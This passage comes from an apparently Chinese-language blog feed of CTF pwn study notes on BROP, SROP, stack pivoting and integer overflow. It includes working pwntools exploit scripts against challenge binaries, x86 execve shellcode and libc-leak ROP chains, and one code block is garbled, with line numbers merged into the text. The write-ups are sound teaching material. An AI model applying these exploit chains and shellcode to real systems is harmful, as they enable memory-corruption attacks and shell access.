gadget: 0x%x&#x27;</span> % addr)</span><br><span class="line">        <span class="keyword">if</span> check_brop_gadget(length, addr):</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;success brop gadget: 0x%x&#x27;</span> % addr)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_puts_addr</span>(<span class="params">length, rdi_ret, stop_gadget</span>):</span><br><span class="line">    addr = <span class="number">0x400559</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="built_in">hex</span>(addr))</span><br><span class="line">        sh = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;A&#x27;</span> * length + p64(rdi_ret) + p64(<span class="number">0x400000</span>) + p64(addr) + p64(stop_gadget)</span><br><span class="line"><span class="comment">#72个A填充栈空间，调用pop rdi；ret gadget将0x400000pop进rdi寄存器，循环增长的地址放在gadget的ret位置，在执行完gadget后直接调用循环增长的地址，如果增长到puts_plt地址就会打印rdi寄存器中地址内存放的字符串，最后的stop gadget是为了让程序不崩溃</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            <span class="keyword">if</span> content.startswith(<span class="string">b&#x27;\x7fELF&#x27;</span>):<span class="comment">#判断是否打印\x7fELF</span></span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&#x27;find puts@plt addr: 0x%x&#x27;</span> % addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line">rdi_ret = <span class="number">0x4007ba</span>+<span class="number">0x9</span></span><br><span class="line"><span class="comment">##get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4005d0</span></span><br><span class="line">puts = get_puts_addr(length,rdi_ret,stop_gadget)</span><br><span class="line"></span><br><span class="line"><span class="comment">#5</span></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##stop_gadget = get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4005d0</span></span><br><span class="line"><span class="comment">##brop_gadget = find_brop_gadget(length,stop_gadget)</span></span><br><span class="line">brop_gadget = <span class="number">0x4007ba</span></span><br><span class="line">rdi_ret = brop_gadget + <span class="number">9</span></span><br><span class="line"><span class="comment">##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span></span><br><span class="line">puts_plt = <span class="number">0x400565</span></span><br><span class="line"><span class="comment">##leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line">ret = brop_gadget + <span class="number">9</span> + <span class="number">1</span><span class="comment">#栈对齐</span></span><br><span class="line">sh = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">puts_addr =u64(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * length + p64(ret) + p64(rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="😭SROP-暂时学不懂，待续"><a href="#😭SROP-暂时学不懂，待续" class="headerlink" title="😭SROP(暂时学不懂，待续)"></a>😭SROP(暂时学不懂，待续)</h2><p><a href="https://xz.aliyun.com/news/12644">文章 - 高级ROP之SROP利用 - 先知社区</a><br>SROP，全称为Sigreturn Oriented Programming，主要触发原理为<code>sigreturn</code>这个系统调用，这个系统调用一般是程序在发生 signal 的时候被间接地调用</p><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>分析内核在 signal 信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：</p><ul><li><strong>Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。</strong></li><li><p>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，<strong>所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame</strong>。<br>说到这里，其实，SROP 的基本利用原理也就出现了。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>看完原理之后我们可以发现，<code>sigreturn</code> 系统调用会将进程恢复为<strong>之前”保存的</strong>“，也就是从栈中pop回到各寄存器，在执行<code>sigreturn</code> 系统调用期间，我们对栈中的值是可以任意读写的，而且由于内核与信号处理程序无关， <code>signal</code> 对应的各个寄存器值并不会被记录，那么，只要我们能够劫持栈中的数据，伪造一个 <code>Signal Frame</code> ，那么就可以控制任意寄存器的值</p><h4 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h4><p>首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个 Signal Frame，如下图所示，这里以 64 位为例子，给出 Signal Frame 更加详细的信息<br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180326.png" alt="Pasted image 20250207180326"><br>当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。获取shell实际上就是执行了系统调用 execve(“/bin/sh”,0,0)<br>获取shell需要满足以下条件：</p></li><li><p>栈溢出以控制栈的内容</p></li><li>能控制rax寄存器为<code>sigreturn</code> 系统调用函数的调用号</li><li>有syscall系统调用函数或者汇编代码</li><li>栈空间足够大</li></ul><p>具体SROP操作如下</p><ol><li>通过栈溢出劫持返回地址，构造SROP</li><li>控制rax寄存器为<code>sigreturn</code> 的系统调用号</li><li>执行syscall进入<code>sigreturn</code> 系统调用</li><li>控制栈布局，使<code>sigreturn</code> 系统调用结束后的pop指令能够准确控制各个寄存器成我们想要的值<br> 例如获取shell的各寄存器控制：<br> rax —&gt;59（execve的系统调用号）<br> rdi —&gt; ‘/bin/sh’<br> rsi —&gt; 0<br> rdx —&gt;0<br> rip —&gt; syscall<br> 此时再继续向下调用时就可以执行execve(“/bin/sh”,0,0)了<h4 id="system-call-chains"><a href="#system-call-chains" class="headerlink" title="system call chains"></a>system call chains</h4>需要指出的是，上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可</li></ol><ul><li><strong>控制栈指针。</strong></li><li><strong>把原来 rip 指向的<code>syscall</code> gadget 换成<code>syscall; ret</code> gadget。</strong><br>如下图所示 ，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。<br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180429.png" alt="Pasted image 20250207180429"><h4 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h4>需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件</li><li><strong>可以通过栈溢出来控制栈的内容</strong></li><li><strong>需要知道相应的地址</strong><ul><li><strong>“/bin/sh”</strong></li><li><strong>Signal Frame</strong></li><li><strong>syscall</strong></li><li><strong>sigreturn</strong></li></ul></li><li>需要有够大的空间来塞下整个 sigal frame<br>此外，关于 sigreturn 以及 syscall;ret 这两个 gadget 在上面并没有提及。提出该攻击的论文作者发现了这些 gadgets 出现的某些地址：<img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180522.png" alt="Pasted image 20250207180522">并且，作者发现，有些系统上 SROP 的地址被随机化了，而有些则没有。比如说<code>Linux &lt; 3.3 x86_64</code>（在 Debian 7.0， Ubuntu Long Term Support， CentOS 6 系统中默认内核)，可以直接在 vsyscall 中的固定地址处找到 syscall&amp;return 代码片段。如下<img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180547.png" alt="Pasted image 20250207180547">但是目前它已经被<code>vsyscall-emulate</code>和<code>vdso</code>机制代替了。此外，目前大多数系统都会开启 ASLR 保护，所以相对来说这些 gadgets 都并不容易找到。</li></ul><p><em>值得一说的是，对于 sigreturn 系统调用来说，在 64 位系统中，sigreturn 系统调用对应的系统调用号为 15，只需要 RAX=15，并且执行 syscall 即可实现调用 syscall 调用。而 RAX 寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说 read 函数的返回值为读取的字节数。</em></p><h4 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h4><p><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250207180210.png" alt="Pasted image 20250207180210"></p><p><strong><em>值得一提的是，在目前的 pwntools 中已经集成了对于 srop 的攻击。</em></strong><br>pwntools集成了有关SROP链的构造函数 <code>SigreturnFrame()</code><br>工具构造和利用如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = </span><br><span class="line">frame.rdi = </span><br><span class="line">frame.rsi = </span><br><span class="line">frame.rdx = </span><br><span class="line">frame.rcx = </span><br><span class="line">frame.rip = </span><br><span class="line">frame.rsp =</span><br></pre></td></tr></table></figure><br>用与参与栈布局的构造<br>在payload构造中利用bytes(frame)包裹即可</p><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/srop/2016-360%E6%98%A5%E7%A7%8B%E6%9D%AF-srop">ctf-challenges/pwn/stackoverflow/srop/2016-360春秋杯-srop at master · ctf-wiki/ctf-challenges</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN技巧-栈迁移</title>
      <link href="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移原理介绍与应用 - Max1z - 博客园</a></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>我们首先介绍一下Stack pivoting的含义：<strong><em>该技巧就是劫持栈指针指向攻击者所能控制的内存处</em></strong>，然后再在相应的位置进行ROP。一般来说，我们可能在以下情况需要使用stack pivoting:</p><ul><li>可以控制的栈溢出的字节数较少，难以构造较长的ROP链</li><li>开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域。</li><li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写rop及进行堆漏洞利用<br>此外，利用 stack pivoting有以下几个<strong>要求</strong>：</li><li>可以控制程序执行流</li><li>可以控制sp指针。一般来说，控制栈指针会使用ROP，常见的控制栈指针的gadgets一般是<code>pop rsp/esp</code><br>当然，还会有一些其它的姿势。比如说libc_csu_init中的gadgets，我们通过偏移就可以得到控制rsp指针<br>上面是正常的，下面是偏移的<br><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217164554.png" alt="Pasted image 20250217164554"><br>此外，还有更加高级的 fake frame</li><li>存在可以控制内容的内存，一般有如下</li><li>bss段。由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k，0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限。</li><li>heap。但是这个需要我们能够泄露堆地址</li></ul><h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h2><blockquote><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w">ctf-challenges/pwn/stackoverflow/stackprivot/X-CTF Quals 2016 - b0verfl0w at master · ctf-wiki/ctf-challenges</a></p></blockquote><p>32位，保护全关，泪目<img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217165404.png" alt="Pasted image 20250217165404"></p><p>有输入点,测一下偏移<br><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217170719.png" alt="Pasted image 20250217170719"></p><p>36个可以覆盖到返回地址，32个覆盖到ebp(栈底)<br><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217182115.png" alt="Pasted image 20250217182115"></p><p>只能溢出14个字节，很难执行一些比较好的ROP，考虑栈迁移<br>没有开启堆栈保护，我们可以在直接在栈上布置shellcode并执行<br>思路如下：</p><ul><li>利用栈溢出布置shellcode</li><li>控制eip指向shellcode处<blockquote><p>payload的长度为44字节，其中的shellcode_x86长度为22字节，不能直接将shellcode注入栈中，否则会破坏栈</p></blockquote></li></ul><p>可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp的gadgets了<br>我们搜索一下可以控制程序跳转到esp处的gadget<img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217193710.png" alt="Pasted image 20250217193710">我们需要jmp esp<br>因此将shellcode布局如下<br><strong>shellcode</strong>|<strong>padding</strong>|<strong>fake epb</strong>|<strong>0x08048504</strong>|<strong>set esp point to shellcode and jmp esp</strong>|<br><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217205904.png" alt="Pasted image 20250217205904"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./b0verfl0w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_x86 = <span class="string">b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode_x86 += <span class="string">b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode_x86 += <span class="string">b&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">sub_esp_jmp = asm(<span class="string">&#x27;sub esp, 0x28;jmp esp&#x27;</span>)</span><br><span class="line">jmp_esp = <span class="number">0x08048504</span></span><br><span class="line">payload = shellcode_x86 + (</span><br><span class="line">    <span class="number">0x20</span> - <span class="built_in">len</span>(shellcode_x86)) * <span class="string">b&#x27;b&#x27;</span> + <span class="string">b&#x27;bbbb&#x27;</span> + p32(jmp_esp) + sub_esp_jmp</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217180521.png" alt="Pasted image 20250217180521"><br>先把字节码转为汇编<br><strong><em>getshell!</em></strong><br><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250217210219.png" alt="Pasted image 20250217210219"></p><h2 id="示例2-x86"><a href="#示例2-x86" class="headerlink" title="示例2(x86)"></a>示例2(x86)</h2><blockquote><p>参考:<a href="https://blog.csdn.net/qq_38154820/article/details/106330238">32位以及64位栈迁移的具体分析与学习-CSDN博客</a><br><a href="https://www.yuque.com/wendyjellybeans/mhpnug/lcfyf0#VAWnD">Hitcon-Training lab1-lab15</a></p></blockquote><p>栈迁移的技术，分为32位和64位ELF，我们先来学习32位栈迁移<br>明确一个观点，<strong>栈的内容即程序EIP执行的流程(因为我们总是覆盖函数的返回地址)</strong><br><strong>栈中的内容都是</strong>栈：函数 返回地址 参数</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>栈迁移正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。我们可利用该技巧<strong>来解决栈溢出空间大小不足的问题</strong>。<br>我们进入一个函数的时候，会执行call指令<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">call <span class="title function_">func</span><span class="params">()</span>;    <span class="comment">//push eip+4;  push ebp;   mov ebp,esp;</span></span><br></pre></td></tr></table></figure><br>call func() 执行完要退出的时候要进行与call func相反的操作（恢复现场）维持栈平衡！<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">leave;          <span class="comment">//mov esp,ebp;  pop ebp;</span></span><br><span class="line">ret ;            <span class="comment">// pop eip</span></span><br></pre></td></tr></table></figure><br>栈迁移的核心思想就是将栈 的esp 和 ebp 转移到一个输入不受长度限制的且可控制的地址处，通常是 bss 段地址。<br>在最后ret 的时候  如果我们能够控制栈顶 esp指向的地址就想到控制了程序执行流！<br><a href="https://blog.csdn.net/yuanyunfeng3/article/details/51456049">栈的迁移技巧在CTF pwn挑战中的应用-CSDN博客</a></p><p>xxxxxxxxxx28 1from pwn import <em>2context(os=’linux’, arch=’amd64’, log_level=’debug’)3​4io = process(‘./pwn2’)5elf = ELF(‘./pwn2’)6​7vul = 0x4009E78write = 0x4009DD9​10pop_rdi = 0x4014c611pop_rsi = 0x4015e712pop_rdx = 0x44262613jmp_rsi = 0x4a331314mov_rdi_esi = 0x47a3b315​16payload  = “A”</em>0x8817payload += p64(pop_rsi) + p64(7) + p64(pop_rdi) + p64(elf.sym[‘<strong>stack_prot’]) + p64(mov_rdi_esi)18payload += p64(pop_rdi) + p64(elf.sym[‘</strong>libc_stack_end’]) + p64(elf.sym[‘_dl_make_stack_executable’])19payload += p64(vul)20​21io.sendlineafter(‘welcome~\n’, payload)22​23shellcode = asm(shellcraft.sh())24payload = shellcode.ljust(0x88, “A”) + p64(jmp_rsi)25​26io.sendline(payload)27​28io.interactive()python</p><h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><p><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250218144214.png" alt="Pasted image 20250218144214"><br><img src="/2025/02/18/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E8%BF%81%E7%A7%BB/Pasted image 20250218163306.png" alt="Pasted image 20250218163306"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pay1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>)+p32(buf)+p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2=p32(buf1)+p32(puts_plt)+p32(pop_ebx_ret)+p32(puts_got)</span><br><span class="line">payload2+=p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(buf1)+p32(<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload3=p32(buf)+p32(read_plt)+p32(pop3ret)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0x100</span>)</span><br><span class="line">payload3+=p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(buf)</span><br></pre></td></tr></table></figure><p>具体流程详见excel<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./migration&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./migration&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span>  </span><br><span class="line"></span><br><span class="line">buf=elf.bss()+<span class="number">0x500</span></span><br><span class="line">buf1=elf.bss()+<span class="number">0x400</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf1))</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">leave_ret=<span class="number">0x08048504</span></span><br><span class="line"><span class="comment"># 0x08048504 : leave ; ret</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>)+p32(buf)+p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0x100</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;best :\n&#x27;</span>,payload1)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_ebx_ret=<span class="number">0x804836d</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2=p32(buf1)+p32(puts_plt)+p32(pop_ebx_ret)+p32(puts_got)</span><br><span class="line">payload2+=p32(read_plt)+p32(leave_ret)+p32(<span class="number">0</span>)+p32(buf1)+p32(<span class="number">0x100</span>)</span><br><span class="line">  </span><br><span class="line">io.sendline(payload2)</span><br><span class="line">  </span><br><span class="line">puts_addr=u32(io.recv(<span class="number">4</span>))  </span><br><span class="line">success(<span class="string">&quot;puts_addr ==&gt; &quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">  </span><br><span class="line">pop3ret=<span class="number">0x08048569</span></span><br><span class="line">payload3=p32(buf)+p32(read_plt)+p32(pop3ret)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="number">0x100</span>)</span><br><span class="line">payload3+=p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(buf)</span><br><span class="line"></span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 栈 </tag>
            
            <tag> PWN技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN入门-整数溢出</title>
      <link href="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"/>
      <url>/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><p>再说整数溢出之前，我们首先的先来说一下C语言中的整型的数据分类。<br>按<strong>数据类型</strong>分类主要分三类：短整型（short)、整型(int)、长整型(long)<br>按<strong>符号</strong>分类：有符号、无符号<br>并且每种数据类型都有自己的大小范围<br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/image-20250119185759490.png" alt="image-20250119185759490"><br><strong>整形：</strong></p><p><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250214231319.png" alt="Pasted image 20250214231319"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> b = <span class="number">65537</span>;</span><br><span class="line">    <span class="keyword">if</span>(a == b)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Int overflow successfully!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译<br><code>gcc -g test.c -o test</code><br>运行一下程序输出Int overflow successfully!<br>unsigned short int的范围是0~65535，对变量b的赋值超过了这个范围，因此hex的数据最高位被截断，从而变成了0x0001=1</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><a href="https://www.52pojie.cn/thread-1032448-1-1.html">XCTF攻防世界int_overflow - 吾爱破解 - 52pojie.cn</a><br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215181914.png" alt="Pasted image 20250215181914"><br>只开NX(栈上不可执行保护)，相当于没有开保护<br>放入IDA中<br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215182050.png" alt="Pasted image 20250215182050"><br>main函数选择功能，比较简单，看看login，两个可以利用的read<br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215182113.png" alt="Pasted image 20250215182113"></p><blockquote><p>看login函数，0x19u表示无符号数</p></blockquote><p>看看check_passwd函数<br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215182313.png" alt="Pasted image 20250215182313"></p><ul><li>unsigned__int8表示8bit无符号整数，可能存在整数溢出</li><li>max_passwd为0x199，数据过大</li><li>通过整数溢出，可将v2实际长度(260-264)截断变成(4-8)<br>同时还能找到一个后门函数<br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215182359.png" alt="Pasted image 20250215182359"><br><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215185941.png" alt="Pasted image 20250215185941"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./IntOverflow&quot;</span>)  </span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;username:\n&quot;</span>,<span class="string">&quot;zechariah&quot;</span>)</span><br><span class="line">cat_flag_addr = <span class="number">0x08048694</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x18</span>  + p32(cat_flag_addr) + <span class="string">b&quot;A&quot;</span> * <span class="number">234</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;passwd:\n&quot;</span>,payload)</span><br><span class="line"><span class="built_in">print</span> (p.recvall())</span><br></pre></td></tr></table></figure><img src="/2025/02/18/PWN%E5%85%A5%E9%97%A8-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/Pasted image 20250215185924.png" alt="Pasted image 20250215185924"><br><strong><em>get shell!</em></strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 整数溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN技巧-栈对齐</title>
